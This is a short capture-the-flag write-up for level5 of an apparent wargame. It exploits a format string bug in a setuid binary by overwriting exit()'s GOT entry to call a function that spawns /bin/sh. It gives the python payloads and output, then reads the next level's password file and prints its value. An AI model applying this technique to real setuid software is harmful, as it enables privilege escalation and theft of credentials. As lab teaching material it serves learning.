There is a setuid binary "level5" own by level6

After disassembling the binary we can see that main() function call function n()
which call printf()

Here again the vulnerability resides in the printf() call
as user can set the format string to write into variable
This is a Format String Attack

There is a o() function which call system() with "/bin/sh"
located at [0x80484a4]

Function n() doesn't return but use exit Instead so we can't Overwrite the return address

After analysing deeper we see that the exit() call use the Global Offset Table
and use a jump on it

exit() located at [0x80483d0] jump to what it's stored in [0x8049838] inside the GOT

So if we overwrite the GOT address to redirect the real glibc exit() to function o()
we'll get a shell

We need to print the memory until we reach the address of the variable we want to change

level5@RainFall:~$> python -c 'print "\x38\x98\x04\x08" + " %x" * 5' | ./level5
8Â˜ 200 b7fd1ac0 b7ff37d0 8049838 20782520

So we need to modify the fourth one to 0x80484a4 which is 134513828 in decimal with "%134513824x" + "%4$n"
here it's 134513824 because we already have four bytes printed with the address

level5@RainFall:~$> python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"' | ./level5 >/dev/null

level6@RainFall:~$> cat ~level6/.pass >&2
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
